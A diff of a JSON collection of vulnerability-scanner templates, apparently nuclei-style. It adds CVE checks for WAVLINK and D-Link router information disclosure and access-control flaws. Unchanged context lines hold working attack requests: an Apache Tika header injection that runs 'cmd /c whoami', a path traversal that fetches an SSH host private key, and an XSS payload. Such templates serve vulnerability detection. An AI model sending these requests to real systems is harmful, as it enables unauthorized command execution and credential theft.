@@ -6462,11 +6462,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Content-type": "image/jp2",
-            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue"
+            "Expect": "100-continue",
+            "Content-type": "image/jp2",
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -10415,6 +10415,21 @@
           "raw": [
             "GET / HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nConnection: close\n",
             "GET {{endpoint}}../../../../bin/.ssh_host_rsa_key HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nCache-Control: max-age=0\nConnection: close\nReferer: http://{{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-12127",
+      "info": {
+        "name": "WAVLINK WN530H4 M30H4.V5030.190403 - Information Disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cgi-bin/ExportAllSettings.sh"
           ]
         }
       ]
@@ -19637,6 +19652,22 @@
       ]
     },
     {
+      "id": "CVE-2022-28955",
+      "info": {
+        "name": "D-Link DIR816L - Access Control",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/category_view.php",
+            "{{BaseURL}}/folder_view.php"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-29014",
       "info": {
         "name": "Razer Sila Gaming Router 2.0.441_api-2.0.418 - Local File Inclusion",
@@ -19930,6 +19961,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/card_scan.php?No=0000&ReaderNo=0000&CardFormatNo=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-31846",
+      "info": {
+        "name": "WAVLINK WN535 G3 - Information Disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/live_mfg.shtml"
           ]
         }
       ]
